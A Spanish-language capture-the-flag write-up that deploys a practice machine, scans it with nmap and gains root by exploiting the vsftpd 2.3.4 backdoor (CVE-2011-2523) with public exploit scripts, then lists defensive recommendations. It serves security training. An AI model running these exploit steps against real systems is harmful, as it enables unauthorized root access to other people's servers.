# 🖥️ **Máquina: FirstHacking**  
- **🔹 Dificultad:** Muy Fácil  
- **📌 Descripción:** Máquina de práctica enfocada en la explotación de un servicio FTP vulnerable (vsftpd 2.3.4).  
- **🎯 Objetivo:** Obtener acceso no autorizado a través de una vulnerabilidad conocida.

---

## 🚀 **Despliegue de la Máquina**

1. **Descarga y descompresión:**  
   Primero descargamos la máquina vulnerable y la descomprimimos con el comando:
   ```bash
   unzip firsthacking.zip
   ```

2. **Ejecución de la máquina:**  
   Ejecutamos el entorno con:
   ```bash
   sudo bash auto_deploy.sh firsthacking.tar
   ```

   ![](/FirstHacking/Imagenes/Maquina.png)  
   ![](/FirstHacking/Imagenes/Activar.jpeg)

3. **Verificación de conectividad:**  
   Comprobamos que la máquina esté activa con un `ping` a su IP:
   ```bash
   ping -c4 172.17.0.2
   ```

   ![](/FirstHacking/Imagenes/Ping.jpeg)

---

## 🔍 **Reconocimiento**

1. **Escaneo de puertos (Nmap):**  
   Utilizamos Nmap para identificar puertos abiertos:
   ```bash
   sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
   ```

   ![](/FirstHacking/Imagenes/Puertos.jpeg)

2. **Análisis de servicios y versiones:**  
   Luego escaneamos los puertos detectados para obtener más información sobre los servicios:
   ```bash
   nmap -sC -sV -p 21 172.17.0.2 -oN target.txt
   ```

   > ✨ *Nota:* Puedes encontrar más detalles sobre cómo automatizar y optimizar escaneos Nmap en [nmap-escaneos-y-funciones](#).

   ![](/FirstHacking/Imagenes/Servicios.jpeg)

---

## 💥 **Explotación**

### 🔸 Servicio identificado: **FTP (vsftpd 2.3.4)**  
Este servicio es conocido por tener una puerta trasera (backdoor) introducida maliciosamente en versiones comprometidas.

#### 📌 Opción 1: Usar un script de GitHub
1. Clonamos el repositorio del exploit:
   ```bash
   git clone https://github.com/nobodyatall648/CVE-2011-2523
   cd CVE-2011-2523
   ```

2. Ejecutamos el exploit:
   ```bash
   python3 vsftpd_2.3.4_exploit.py 172.17.0.2
   ```

   ![](/FirstHacking/Imagenes/Git.jpeg)  
   ![](/FirstHacking/Imagenes/Exploit.jpeg)

#### 📌 Opción 2: Usar `searchsploit` (Exploit-DB)
1. Buscar la vulnerabilidad:
   ```bash
   searchsploit vsftpd 2.3.4
   ```

2. Copiar el exploit al directorio actual:
   ```bash
   searchsploit -m unix/remote/49757.py
   ```

3. Ejecutar el script:
   ```bash
   python3 49757.py 172.17.0.2
   ```

   ![](/FirstHacking/Imagenes/Metododos.jpeg)  
   ![](/FirstHacking/Imagenes/Resultado.jpeg)

---

## ✅ **Resultado Final**

La ejecución del exploit proporciona acceso no autorizado al sistema como **usuario root** a través del servicio FTP, logrando así comprometer la máquina con éxito.

---

## 🛡️ **Recomendaciones**

- **Actualizar software vulnerable:** Evitar el uso de versiones antiguas de servicios como vsftpd. La versión 2.3.4 contiene una puerta trasera introducida maliciosamente.
- **Monitoreo de servicios expuestos:** Limitar el acceso a servicios innecesarios y configurar firewalls para reducir la superficie de ataque.
- **Auditorías periódicas:** Realizar escaneos de seguridad regulares para identificar vulnerabilidades conocidas.
- **Uso de honeypots:** En entornos controlados, se puede usar esta vulnerabilidad como señuelo educativo o de detección de intrusos.

---

## 📚 **Aprendizajes Clave**

- La herramienta **Nmap** es fundamental para el reconocimiento de servicios y detección temprana de vectores de ataque.
- Las bases de datos como **Exploit-DB** y herramientas como **Searchsploit** permiten identificar rápidamente vulnerabilidades conocidas.
- La explotación de **vsftpd 2.3.4** demuestra la importancia de la gestión de versiones y parches de seguridad.
- Usar scripts existentes requiere comprensión previa de su funcionamiento para evitar errores o mal uso.
